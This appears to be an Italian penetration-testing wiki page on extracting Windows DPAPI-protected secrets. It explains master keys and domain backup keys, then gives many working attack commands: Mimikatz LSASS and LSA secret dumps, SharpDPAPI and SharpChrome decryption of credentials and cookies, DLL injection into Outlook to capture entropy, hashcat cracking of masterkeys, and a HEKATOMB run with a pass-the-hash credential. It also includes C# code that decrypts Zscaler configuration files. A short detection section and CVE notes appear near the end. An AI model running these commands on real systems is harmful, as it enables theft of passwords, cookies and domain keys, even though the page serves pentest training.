# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## Cos'è DPAPI

L'API Data Protection (DPAPI) è utilizzata principalmente nel sistema operativo Windows per la **crittografia simmetrica di chiavi private asimmetriche**, sfruttando come fonte di entropia i segreti dell'utente o del sistema. Questo approccio semplifica la cifratura per gli sviluppatori permettendo loro di cifrare i dati usando una chiave derivata dai segreti di accesso dell'utente o, per la cifratura di sistema, dai segreti di autenticazione di dominio del sistema, eliminando così la necessità per gli sviluppatori di gestire la protezione della chiave di cifratura.

Il modo più comune di usare DPAPI è tramite le funzioni **`CryptProtectData` e `CryptUnprotectData`**, che permettono alle applicazioni di criptare e decriptare i dati in modo sicuro con la sessione dell'account attualmente autenticato. Questo significa che i dati criptati possono essere decriptati solo dallo stesso utente o sistema che li ha criptati.

Inoltre, queste funzioni accettano anche un parametro **`entropy`** che viene usato durante la cifratura e la decifratura; quindi, per decriptare qualcosa cifrato usando questo parametro, è necessario fornire lo stesso valore di entropy utilizzato in fase di cifratura.

### Generazione della chiave utente

DPAPI genera una chiave unica (chiamata **`pre-key`**) per ogni utente basata sulle sue credenziali. Questa chiave è derivata dalla password dell'utente e da altri fattori; l'algoritmo dipende dal tipo di utente ma il risultato finale è basato su SHA1. Ad esempio, per gli utenti di dominio, **dipende dall'hash NTLM dell'utente**.

Questo è particolarmente interessante perché se un attaccante riesce a ottenere l'hash della password dell'utente, può:

- **Decriptare qualsiasi dato che è stato cifrato usando DPAPI** con la chiave di quell'utente senza dover contattare alcuna API
- Tentare di **craccare la password** offline cercando di generare la `pre-key` DPAPI valida

Inoltre, ogni volta che dei dati vengono cifrati da un utente usando DPAPI, viene generata una nuova **master key**. Questa master key è quella effettivamente usata per cifrare i dati. Ogni master key ha un associato un **GUID** (Globally Unique Identifier) che la identifica.

Le master key sono conservate nella directory **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, dove `{SID}` è il Security Identifier di quell'utente. La master key è memorizzata cifrata dalla **`pre-key`** dell'utente e anche da una **domain backup key** per il recupero (quindi la stessa chiave è memorizzata cifrata 2 volte con 2 protezioni diverse).

Nota che la **domain key usata per cifrare la master key si trova nei domain controller e non cambia mai**, quindi se un attaccante ha accesso al domain controller, può recuperare la domain backup key e decriptare le master key di tutti gli utenti del dominio.

I blob cifrati contengono il **GUID della master key** che è stato usato per cifrare i dati all'interno dei loro header.

> [!TIP]
> I blob cifrati DPAPI iniziano con **`01 00 00 00`**

Trova le master key:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Questo è l'aspetto di un insieme di Master Keys di un utente:

![](<../../images/image (1121).png>)

### Generazione della chiave Machine/System

Questa è la chiave usata dalla macchina per cifrare i dati. Si basa sul **DPAPI_SYSTEM LSA secret**, che è una chiave speciale accessibile solo dall'utente SYSTEM. Questa chiave viene usata per cifrare dati che devono essere accessibili dallo stesso sistema, come credenziali a livello macchina o segreti a livello di sistema.

Nota che queste chiavi **non hanno un backup del dominio**, quindi sono accessibili solo localmente:

- **Mimikatz** può accedervi effettuando il dump degli LSA secrets con il comando: `mimikatz lsadump::secrets`
- Il segreto è memorizzato nel registro, quindi un amministratore potrebbe **modificare i permessi DACL per accedervi**. Il percorso del registro è: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Dati protetti da DPAPI

Tra i dati personali protetti da DPAPI ci sono:

- credenziali Windows
- le password e i dati di completamento automatico di Internet Explorer e Google Chrome
- password di email e account FTP interni per applicazioni come Outlook e Windows Mail
- password per cartelle condivise, risorse, reti wireless e Windows Vault, incluse le chiavi di cifratura
- password per connessioni remote desktop, .NET Passport e chiavi private per vari scopi di cifratura e autenticazione
- password di rete gestite da Credential Manager e dati personali in applicazioni che usano CryptProtectData, come Skype, MSN messenger e altri
- blob cifrati all'interno del registro
- ...

I dati protetti a livello di sistema includono:
- password Wi‑Fi
- password delle attività pianificate
- ...

### Opzioni per l'estrazione delle master key

- Se l'utente ha privilegi di domain admin, può accedere alla **chiave di backup del dominio** per decrittare tutte le master key degli utenti nel dominio:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Con privilegi di amministratore locale, è possibile **accedere alla memoria di LSASS** per estrarre le chiavi master DPAPI di tutti gli utenti connessi e la chiave SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Se l'utente ha privilegi di amministratore locale, può accedere al **DPAPI_SYSTEM LSA secret** per decriptare le machine master keys:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Se la password o l'hash NTLM dell'utente sono noti, puoi **decriptare direttamente le chiavi master dell'utente**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Se sei dentro una sessione come utente, è possibile chiedere al DC la **backup key to decrypt the master keys using RPC**. Se sei local admin e l'utente è connesso, potresti **steal his session token** per questo:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Elenca Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Accesso ai dati DPAPI crittografati

### Trovare i dati DPAPI crittografati

I file protetti degli utenti si trovano comunemente in:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Controlla anche sostituendo `\Roaming\` con `\Local\` nei percorsi sopra.

Esempi di enumerazione:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) può trovare blob crittografati DPAPI nel file system, nel registro e in blob B64:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Nota che [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (dallo stesso repo) può essere usato per decrittare, usando DPAPI, dati sensibili come i cookies.

### Chiavi di accesso e dati

- **Usa SharpDPAPI** per ottenere le credenziali da file cifrati con DPAPI della sessione corrente:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Recupera informazioni sulle credenziali** come i dati cifrati e la guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Decrittografa un masterkey di un utente che richiede la **domain backup key** usando RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Lo strumento **SharpDPAPI** supporta anche questi argomenti per la decrittazione della masterkey (nota come sia possibile usare `/rpc` per ottenere la chiave di backup del dominio, `/password` per usare una password in chiaro, oppure `/pvk` per specificare un file di chiave privata di dominio DPAPI...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Decrypt data using a masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Lo strumento **SharpDPAPI** supporta anche questi argomenti per la decrittazione di `credentials|vaults|rdg|keepass|triage|blob|ps` (nota come è possibile usare `/rpc` per ottenere la chiave di backup del dominio, `/password` per usare una password in chiaro, `/pvk` per specificare un file di chiave privata DPAPI del dominio, `/unprotect` per usare la sessione dell'utente corrente...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Decriptare alcuni dati usando la **sessione utente corrente**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Gestione di Optional Entropy ("Third-party entropy")

Alcune applicazioni passano un valore aggiuntivo di **entropy** a `CryptProtectData`. Senza questo valore il blob non può essere decrittato, anche se la masterkey corretta è nota. Ottenere l'entropy è quindi essenziale quando si prendono di mira credenziali protette in questo modo (es. Microsoft Outlook, alcuni client VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) è una user-mode DLL che hooks le funzioni DPAPI all'interno del target process e registra in modo trasparente qualsiasi optional entropy fornita. Eseguire EntropyCapture in modalità **DLL-injection** contro processi come `outlook.exe` o `vpnclient.exe` genererà un file che associa ogni entropy buffer al processo chiamante e al blob. L'entropy catturata può poi essere fornita a **SharpDPAPI** (`/entropy:`) o **Mimikatz** (`/entropy:<file>`) per decrittare i dati.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft ha introdotto il formato masterkey **context 3** a partire da Windows 10 v1607 (2016). `hashcat` v6.2.6 (dicembre 2023) ha aggiunto gli hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) e **22102** (context 3) consentendo il cracking accelerato via GPU delle password utente direttamente dal file masterkey. Gli attaccanti possono quindi eseguire attacchi word-list o brute-force senza interagire con il sistema target.

`DPAPISnoop` (2024) automatizza il processo:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Lo strumento può anche analizzare i Credential and Vault blobs, decifrarli con chiavi crackate ed esportare cleartext passwords.


### Accedere ai dati di un'altra macchina

In **SharpDPAPI and SharpChrome** puoi indicare l'opzione **`/server:HOST`** per accedere ai dati di una macchina remota. Ovviamente devi poter accedere a quella macchina e nell'esempio seguente si suppone che la **chiave di cifratura di backup del dominio sia nota**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Altri strumenti

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) è uno strumento che automatizza l'estrazione di tutti gli utenti e computer dalla directory LDAP e l'estrazione della domain controller backup key tramite RPC. Lo script risolverà quindi gli indirizzi IP di tutti i computer ed eseguirà uno smbclient su tutti i sistemi per recuperare tutti i DPAPI blob di tutti gli utenti e decifrare tutto con la domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Con la lista di computer estratta da LDAP puoi trovare ogni sottorete anche se non la conoscevi!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) può estrarre segreti protetti da DPAPI automaticamente. La release 2.x ha introdotto:

* Raccolta parallela di blob da centinaia di host
* Parsing delle masterkey di **context 3** e integrazione con cracking automatico usando Hashcat
* Supporto per i cookie criptati "App-Bound" di Chrome (vedi sezione successiva)
* Una nuova modalità **`--snapshot`** per interrogare ripetutamente gli endpoint e fare il diff dei blob appena creati

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) è un parser C# per file masterkey/credential/vault che può generare formati per Hashcat/JtR e, opzionalmente, avviare automaticamente il cracking. Supporta pienamente i formati di masterkey macchina e utente fino a Windows 11 24H1.


## Rilevazioni comuni

- Accesso a file in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` e altre directory correlate a DPAPI.
- Soprattutto da una condivisione di rete come **C$** o **ADMIN$**.
- Utilizzo di **Mimikatz**, **SharpDPAPI** o tool simili per eseguire dump della memoria LSASS o delle masterkey.
- Evento **4662**: *Un'operazione è stata eseguita su un oggetto* – può essere correlato con l'accesso all'oggetto **`BCKUPKEY`**.
- Evento **4673/4674** quando un processo richiede *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### 2023-2025 vulnerabilità & cambiamenti dell'ecosistema

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Un attaccante con accesso di rete poteva indurre un domain member a recuperare una domain controller backup key malevola, permettendo la decrittazione delle masterkey utente. Sistemato nell'aggiornamento cumulativo di novembre 2023 – gli amministratori dovrebbero assicurarsi che DC e workstation siano completamente aggiornati.
* **Chrome 127 “App-Bound” cookie encryption** (July 2024) ha sostituito la protezione legacy basata solo su DPAPI con una chiave aggiuntiva memorizzata nel **Credential Manager** dell'utente. La decrittazione offline dei cookie ora richiede sia la masterkey DPAPI sia la **GCM-wrapped app-bound key**. SharpChrome v2.3 e DonPAPI 2.x sono in grado di recuperare la chiave aggiuntiva quando vengono eseguiti con contesto utente.


### Caso di studio: Zscaler Client Connector – Entropia personalizzata derivata dal SID

Zscaler Client Connector memorizza diversi file di configurazione sotto `C:\ProgramData\Zscaler` (es. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Ogni file è criptato con **DPAPI (Machine scope)** ma il vendor fornisce **custom entropy** che viene *calcolata a runtime* anziché essere memorizzata su disco.

L'entropia viene ricostruita da due elementi:

1. Un segreto hard-coded incorporato in `ZSACredentialProvider.dll`.
2. Il **SID** dell'account Windows a cui appartiene la configurazione.

L'algoritmo implementato dalla DLL è equivalente a:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Poiché il segreto è incorporato in una DLL che può essere letta dal disco, **qualsiasi attaccante locale con SYSTEM rights può rigenerare l'entropia per qualsiasi SID** e decrypt the blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
La decrittazione restituisce la configurazione JSON completa, inclusi tutti i **device posture check** e i loro valori attesi – informazioni molto utili quando si tentano client-side bypasses.

> TIP: gli altri artefatti crittografati (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) sono protetti con DPAPI **senza** entropy (`16` zero bytes). Possono quindi essere decrittati direttamente con `ProtectedData.Unprotect` una volta ottenuti i privilegi SYSTEM.

## Riferimenti

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
